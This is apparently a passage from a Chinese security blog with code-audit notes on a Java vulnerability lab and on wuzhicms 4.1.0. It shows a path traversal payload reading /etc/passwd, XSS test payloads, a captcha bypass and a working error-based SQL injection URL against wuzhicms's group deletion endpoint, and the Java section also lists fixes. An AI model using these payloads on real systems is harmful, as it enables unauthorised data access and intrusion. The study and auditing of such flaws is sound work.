href="https://xz.aliyun.com/news/14795">https://xz.aliyun.com/news/14795</a></p><h2 id="路径遍历"><a href="#路径遍历" class="headerlink" title="路径遍历"></a>路径遍历</h2><ol><li><p>\src\main\java\org\joychou\controller\PathTraversal.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment">     * http://localhost:8080/path_traversal/vul?filepath=../../../../../etc/passwd</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-meta">@GetMapping(&quot;/path_traversal/vul&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getImage</span><span class="hljs-params">(String filepath)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-keyword">return</span> getImgBase64(filepath);<br>    &#125;<br></code></pre></td></tr></table></figure><p>输入路径之后，<code>filepath</code> 参数直接传递给 <code>getImgBase64</code> 方法，未做任何验证，只存在一个basa64编码（getImgBase64）</p></li><li><p>追溯getImgBase64</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> String <span class="hljs-title function_">getImgBase64</span><span class="hljs-params">(String imgFile)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br><br>        logger.info(<span class="hljs-string">&quot;Working directory: &quot;</span> + System.getProperty(<span class="hljs-string">&quot;user.dir&quot;</span>));<br>        logger.info(<span class="hljs-string">&quot;File path: &quot;</span> + imgFile);<br><br>        <span class="hljs-type">File</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(imgFile);<br>        <span class="hljs-keyword">if</span> (f.exists() &amp;&amp; !f.isDirectory()) &#123;<br>            <span class="hljs-type">byte</span>[] data = Files.readAllBytes(Paths.get(imgFile));<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(Base64.encodeBase64(data));<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;File doesn&#x27;t exist or is not a file.&quot;</span>;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure></li><li><p>payload：<a href="http://localhost:9000/path_traversal/vul?filepath=d:/test.txt">http://localhost:9000/path_traversal/vul?filepath=d:/test.txt</a></p><p>读取D盘下的测试文件（发现可以成功读取内容）</p></li></ol><p><strong>解决：</strong>（过滤）</p><ol><li>使用白名单过滤、</li><li>使用 <code>Path</code> 和 <code>normalize()</code> 方法（根目录怕拼接）<ul><li>使用 <code>Path.resolve()</code> 而非字符串拼接。</li><li>使用 <code>normalize()</code> 方法规范化路径，防止 <code>../</code> 绕过。</li></ul></li></ol><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p>\src\main\java\org\joychou\controller\FileUpload.java</p><ol><li><p>无过滤</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@PostMapping(&quot;/upload&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">singleFileUpload</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(&quot;file&quot;)</span> MultipartFile file,</span><br><span class="hljs-params">                                   RedirectAttributes redirectAttributes)</span> &#123;<br>        <span class="hljs-keyword">if</span> (file.isEmpty()) &#123;<br>            <span class="hljs-comment">// 赋值给uploadStatus.html里的动态参数message</span><br>            redirectAttributes.addFlashAttribute(<span class="hljs-string">&quot;message&quot;</span>, <span class="hljs-string">&quot;Please select a file to upload&quot;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;redirect:/file/status&quot;</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">// Get the file and save it somewhere</span><br>            <span class="hljs-type">byte</span>[] bytes = file.getBytes();<br>            <span class="hljs-type">Path</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> Paths.get(UPLOADED_FOLDER + file.getOriginalFilename());<br>            Files.write(path, bytes);<br><br>            redirectAttributes.addFlashAttribute(<span class="hljs-string">&quot;message&quot;</span>,<br>                    <span class="hljs-string">&quot;You successfully uploaded &#x27;&quot;</span> + UPLOADED_FOLDER + file.getOriginalFilename() + <span class="hljs-string">&quot;&#x27;&quot;</span>);<br><br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            redirectAttributes.addFlashAttribute(<span class="hljs-string">&quot;message&quot;</span>, <span class="hljs-string">&quot;upload failed&quot;</span>);<br>            logger.error(e.toString());<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;redirect:/file/status&quot;</span>;<br>    &#125;<br></code></pre></td></tr></table></figure><p>上传文件  未判断文件的类型、扩展名等信息，未对生成文件的文件名进行重置</p><p>​ 直接将文件上传到文件保存目录中</p></li><li><p>payload</p><p>直接上传</p></li></ol><p>解决：</p><ol><li>使用<strong>白名单</strong>校验扩展名（如 <code>jpg</code>, <code>png</code>, <code>pdf</code>）</li><li>双重验证 MIME 类型（<code>file.getContentType()</code>）</li><li>对上传图片实际内容的判断，如果图片可以正常读取，就判断其为允许上传文件，否则上传失败。</li><li>生成安全文件名（设置成随机字符拼接…）（防止路径遍历和注入）</li></ol><ul><li>如果上传文件名是路径（..&#x2F;是向上跳转，最后会出现路劲遍历的漏洞）</li><li>攻击者知道服务器上已有重要文件（比如其他用户上传的合法文件 <code>avatar.jpg</code>），可以故意使用相同的文件名上传恶意文件（攻击文件），直接覆盖原文件。后续用户访问执行恶意代码</li></ul><h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><p>\src\main\java\org\joychou\controller\XSS.java</p><ul><li><ol><li><pre><code class="java">/**     * Vuln Code.     * ReflectXSS     * http://localhost:8080/xss/reflect?xss=&lt;script&gt;alert(1)&lt;/script&gt;     *     * @param xss unescape string     */    @RequestMapping(&quot;/reflect&quot;)    @ResponseBody    public static String reflect(String xss) &#123;        return xss;    &#125;<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs xml"><br>   参数未做过滤，直接显示在前端页面<br><br>2. payload<br><br>   直接在url中编写xss脚本即可<br><br>   ```html<br>   localhost:9000/xss/reflect?xss=<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure></code></pre></li></ol></li><li><ol><li><pre><code class="java"> /**     * Vul Code.     * StoredXSS Step1     * http://localhost:8080/xss/stored/store?xss=&lt;script&gt;alert(1)&lt;/script&gt;     *     * @param xss unescape string     */    @RequestMapping(&quot;/stored/store&quot;)    @ResponseBody    public String store(String xss, HttpServletResponse response) &#123;        Cookie cookie = new Cookie(&quot;xss&quot;, xss);        response.addCookie(cookie);        return &quot;Set param into cookie&quot;;    &#125;       /**     * Vul Code.     * StoredXSS Step2     * http://localhost:8080/xss/stored/show     *     * @param xss unescape string     */    @RequestMapping(&quot;/stored/show&quot;)    @ResponseBody    public String show(@CookieValue(&quot;xss&quot;) String xss) &#123;        return xss;    &#125;   <figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><br>   存储型xss漏洞<br><br>   ​store方法将未经过滤的参数直接存储于cookie中<br><br>   ​show方法在cookie中将存储的漏洞参数直接显示在页面上<br><br><span class="hljs-bullet">2.</span> payload<br><br></code></pre></td></tr></table></figure>写入&lt;script&gt;alert(1)&lt;/script&gt;</code></pre></li></ol></li></ul><p>解决：</p><ol><li>输入转义（重要）</li><li>限制长度</li></ol>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>wuzhicms代码审计</title>
    <link href="/2025/10/27/wuzhicms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    <url>/2025/10/27/wuzhicms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
    
    <content type="html"><![CDATA[<h1 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h1><p>通过网盘分享的文件：wuzhicms-4.1.0.zip<br>链接: <a href="https://pan.baidu.com/s/1fVsmBHV_0gp4qWEvQuB2Lw">https://pan.baidu.com/s/1fVsmBHV_0gp4qWEvQuB2Lw</a> 提取码: rh9j</p><h1 id="初审-mvc参数"><a href="#初审-mvc参数" class="headerlink" title="初审(mvc参数)"></a>初审(mvc参数)</h1><p>了解到wuzhicms根据MVC,寻找参数</p><ol><li>打开网站，进入index.php,查看index.php源代码</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// +----------------------------------------------------------------------</span><br><span class="hljs-comment">// | wuzhicms [ 五指互联网站内容管理系统 ]</span><br><span class="hljs-comment">// | Copyright (c) 2014-2015 http://www.wuzhicms.com All rights reserved.</span><br><span class="hljs-comment">// | Licensed ( http://www.wuzhicms.com/licenses/ )</span><br><span class="hljs-comment">// | Author: wangcanjia &lt;phpip@qq.com&gt;</span><br><span class="hljs-comment">// +----------------------------------------------------------------------</span><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 程序入口文件</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-comment">//检测PHP环境</span><br><span class="hljs-keyword">if</span>(PHP_VERSION &lt; <span class="hljs-string">&#x27;5.2.0&#x27;</span>) <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Require PHP &gt; 5.2.0 &#x27;</span>);<br><span class="hljs-comment">//定义当前的网站物理路径</span><br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;WWW_ROOT&#x27;</span>,<span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-keyword">__FILE__</span>).<span class="hljs-string">&#x27;/&#x27;</span>);<br><br><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;./configs/web_config.php&#x27;</span>;<br><span class="hljs-keyword">require</span> COREFRAME_ROOT.<span class="hljs-string">&#x27;core.php&#x27;</span>;<br><br><span class="hljs-variable">$app</span> = <span class="hljs-title function_ invoke__">load_class</span>(<span class="hljs-string">&#x27;application&#x27;</span>);<br><span class="hljs-variable">$app</span>-&gt;<span class="hljs-title function_ invoke__">run</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><ol start="2"><li>追溯到 load_class到—————&gt;\coreframe\core.php</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">load_class</span>(<span class="hljs-params"><span class="hljs-variable">$class</span>, <span class="hljs-variable">$m</span> = <span class="hljs-string">&#x27;core&#x27;</span>, <span class="hljs-variable">$param</span> = <span class="hljs-literal">NULL</span></span>) </span>&#123;<br>    <span class="hljs-built_in">static</span> <span class="hljs-variable">$static_class</span> = <span class="hljs-keyword">array</span>();<br><br>    <span class="hljs-comment">//判断是否存在类，存在则直接返回</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$static_class</span>[<span class="hljs-variable">$class</span>])) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$static_class</span>[<span class="hljs-variable">$class</span>];<br>    &#125;<br>    <span class="hljs-variable">$name</span> = <span class="hljs-literal">FALSE</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(COREFRAME_ROOT.<span class="hljs-string">&#x27;app/&#x27;</span>.<span class="hljs-variable">$m</span>.<span class="hljs-string">&#x27;/libs/class/&#x27;</span>.<span class="hljs-variable">$class</span>.<span class="hljs-string">&#x27;.class.php&#x27;</span>)) &#123;<br>        <span class="hljs-variable">$name</span> = <span class="hljs-string">&#x27;WUZHI_&#x27;</span>.<span class="hljs-variable">$class</span>;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">class_exists</span>(<span class="hljs-variable">$name</span>, <span class="hljs-literal">FALSE</span>) === <span class="hljs-literal">FALSE</span>) &#123;<br>            <span class="hljs-keyword">require_once</span>(COREFRAME_ROOT.<span class="hljs-string">&#x27;app/&#x27;</span>.<span class="hljs-variable">$m</span>.<span class="hljs-string">&#x27;/libs/class/&#x27;</span>.<span class="hljs-variable">$class</span>.<span class="hljs-string">&#x27;.class.php&#x27;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//如果存在扩展类，则初始化扩展类</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$class</span>!=<span class="hljs-string">&#x27;application&#x27;</span> &amp;&amp; <span class="hljs-variable">$class</span>!=<span class="hljs-string">&#x27;admin&#x27;</span> &amp;&amp; <span class="hljs-title function_ invoke__">file_exists</span>(COREFRAME_ROOT.<span class="hljs-string">&#x27;app/&#x27;</span>.<span class="hljs-variable">$m</span>.<span class="hljs-string">&#x27;/libs/class/EXT_&#x27;</span>.<span class="hljs-variable">$class</span>.<span class="hljs-string">&#x27;.class.php&#x27;</span>)) &#123;<br>        <span class="hljs-variable">$name</span> = <span class="hljs-string">&#x27;EXT_&#x27;</span>.<span class="hljs-variable">$class</span>;<br>  .............<br></code></pre></td></tr></table></figure><ol start="3"><li><p>查找$static_class的类     (搜索class目录名称以及根据$app &#x3D; load_class(‘application’);)定位到——–&gt;</p><p>coreframe\app\core\libs\class\application.class.php</p></li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-built_in">self</span>::<span class="hljs-title function_ invoke__">setconfig</span>();<br>        <span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;M&#x27;</span>,<span class="hljs-variable">$this</span>-&gt;_m);<br>        <span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;F&#x27;</span>,<span class="hljs-variable">$this</span>-&gt;_f);<br>        <span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;V&#x27;</span>,<span class="hljs-variable">$this</span>-&gt;_v);<br>    &#125;<br></code></pre></td></tr></table></figure><p>参数为    <code>m</code>  <code>f </code>  <code> v</code></p><h1 id="审计"><a href="#审计" class="headerlink" title="审计"></a>审计</h1><h2 id="审计1（xss）"><a href="#审计1（xss）" class="headerlink" title="审计1（xss）"></a>审计1（xss）</h2><p>登录后台后，在“我的提问”中存在xss漏洞</p><p>输入测试语句</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027192519601.png" alt="image-20250717000001395"></p><p>将  <code> &lt;s  </code> 过滤</p><h2 id="审计2（xss）"><a href="#审计2（xss）" class="headerlink" title="审计2（xss）"></a>审计2（xss）</h2><p>未登录后台，在搜索界面测试xss代码</p><p>在将代码闭合之后发现未出现弹窗</p><p>将   <code>/</code>  过滤，转为html编码，发现   <code>#</code>   和   <code>；</code>   也被过滤 </p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027192522349.png" alt="image-20250717003336068"></p><h2 id="审计3（rce）"><a href="#审计3（rce）" class="headerlink" title="审计3（rce）"></a>审计3（rce）</h2><p>抓包进行验证码测试（只输入用户名和密码，不输入验证码）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">username=admin&amp;password=admin&amp;checkcode=&amp;savecookie=1&amp;submit=<br><br>&amp;savecookie=1--------&gt;&amp;savecookie=0<br>直接绕过验证码验证<br></code></pre></td></tr></table></figure><ol><li><p>定位到\configs\web_config.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;TEST_CHECKCODE&#x27;</span>,<span class="hljs-number">0</span>);<span class="hljs-comment">//1 打开测试验证码，0 正常验证码</span><br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;SQL_LOG&#x27;</span>,<span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure></li><li><p>TEST_CHECKCODE———&gt; \api\identifying_code.php\</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$identifying</span> = <span class="hljs-title function_ invoke__">load_class</span>(<span class="hljs-string">&#x27;identifying_code&#x27;</span>);<br><span class="hljs-variable">$code</span> = <span class="hljs-title function_ invoke__">random_string</span>(<span class="hljs-string">&#x27;diy&#x27;</span>, <span class="hljs-number">4</span>, <span class="hljs-string">&#x27;abcdefghkmnpruvwxyzABCDEFGHKMNPRUVWXYZ23456789&#x27;</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">defined</span>(<span class="hljs-string">&#x27;TEST_CHECKCODE&#x27;</span>) &amp;&amp; TEST_CHECKCODE==<span class="hljs-number">1</span>) &#123;<br><span class="hljs-variable">$code</span> = <span class="hljs-string">&#x27;AAAA&#x27;</span>;<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$code</span>);<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location:&quot;</span>.R.<span class="hljs-string">&#x27;images/checkcode.png&#x27;</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$code</span>);<br><span class="hljs-variable">$w</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;w&#x27;</span>]) ? <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;w&#x27;</span>]) : <span class="hljs-number">120</span>;<br><span class="hljs-variable">$h</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;h&#x27;</span>]) ? <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;h&#x27;</span>]) : <span class="hljs-number">27</span>;<br><span class="hljs-variable">$identifying</span>-&gt;<span class="hljs-title function_ invoke__">image_one</span>(<span class="hljs-variable">$code</span>,<span class="hljs-variable">$w</span>,<span class="hljs-variable">$h</span>);<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><h2 id="审计4（sql）"><a href="#审计4（sql）" class="headerlink" title="审计4（sql）"></a>审计4（sql）</h2><p>登录界面有跳转，url输入编号发现报错（测试能否报错注入）</p><p>根据复现1(sql)所寻找的可控变量（$where）</p><ol><li><p>寻找由$where控制的变量</p><p>coreframe\app\core\libs\class\db.class.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">delete</span>(<span class="hljs-params"><span class="hljs-variable">$table</span>, <span class="hljs-variable">$where</span> = <span class="hljs-string">&#x27;&#x27;</span></span>) </span>&#123;<br>    <span class="hljs-variable">$where</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">array2sql</span>(<span class="hljs-variable">$where</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;master_db-&gt;<span class="hljs-title function_ invoke__">delete</span>(<span class="hljs-variable">$table</span>, <span class="hljs-variable">$where</span>);<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>跟进这个delete()</p><p>&#x2F;coreframe&#x2F;app&#x2F;member&#x2F;admin&#x2F;group.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">del</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;groupid&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;groupid&#x27;</span>]) &#123;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;groupid&#x27;</span>])) &#123;<br><span class="hljs-variable">$where</span> = <span class="hljs-string">&#x27; IN (&#x27;</span>.<span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27;,&#x27;</span>, <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;groupid&#x27;</span>]).<span class="hljs-string">&#x27;)&#x27;</span>;<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;groupid&#x27;</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$gid</span>) &#123;<br><span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">delete</span>(<span class="hljs-string">&#x27;member_group_priv&#x27;</span>, <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;groupid&#x27;</span> =&gt; <span class="hljs-variable">$gid</span>));<br>&#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-variable">$where</span> = <span class="hljs-string">&#x27; = &#x27;</span>.<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;groupid&#x27;</span>];<br><span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">delete</span>(<span class="hljs-string">&#x27;member_group_priv&#x27;</span>, <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;groupid&#x27;</span> =&gt; <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;groupid&#x27;</span>]));<br>&#125;<br><br><span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">delete</span>(<span class="hljs-string">&#x27;member_group&#x27;</span>, <span class="hljs-string">&#x27;issystem != 1 AND groupid&#x27;</span>.<span class="hljs-variable">$where</span>);<br><span class="hljs-variable language_">$this</span>-&gt;group-&gt;<span class="hljs-title function_ invoke__">set_cache</span>();<br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;callback&#x27;</span>]))&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;callback&#x27;</span>].<span class="hljs-string">&#x27;(&#123;&quot;status&quot;:1&#125;)&#x27;</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-title function_ invoke__">MSG</span>(<span class="hljs-title function_ invoke__">L</span>(<span class="hljs-string">&#x27;operation_success&#x27;</span>));<br>&#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;callback&#x27;</span>]))&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;callback&#x27;</span>].<span class="hljs-string">&#x27;(&#123;&quot;status&quot;:0&#125;)&#x27;</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-title function_ invoke__">MSG</span>(<span class="hljs-title function_ invoke__">L</span>(<span class="hljs-string">&#x27;operation_failure&#x27;</span>));<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>没有对$GLOBALS[‘groupid’]进行过滤处理，程序通过load_class()来加载核心类函数，实例化对象db并引用delete()方法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">delete</span>(<span class="hljs-params"><span class="hljs-variable">$table</span>, <span class="hljs-variable">$where</span> = <span class="hljs-string">&#x27;&#x27;</span></span>) </span>&#123;<br>    <span class="hljs-variable">$where</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">array2sql</span>(<span class="hljs-variable">$where</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;master_db-&gt;<span class="hljs-title function_ invoke__">delete</span>(<span class="hljs-variable">$table</span>, <span class="hljs-variable">$where</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>array2sql($where)调用$where</p></li><li><p>写入测试代码</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">http://wuzhicms:90/index.php?m=member&amp;f=group&amp;v=del&amp;groupid=1%20and%20updatexml(1,concat(0x7e,database(),0x7e),1)&amp;_su=wuzhicms&amp;%20menuid=86&amp;callback=jQuery111105555776097227751_1667533450920&amp;=1667533450921<br></code></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027192527367.png" alt="image-20250719014224414" style="zoom: 20%;" /></li></ol><h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><h2 id="复现1-sql"><a href="#复现1-sql" class="headerlink" title="复现1(sql)"></a>复现1(sql)</h2><ol><li><p>寻找$sql相关的文件以及定义</p><p>coreframe\app\core\libs\class\mysql.class.php</p></li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 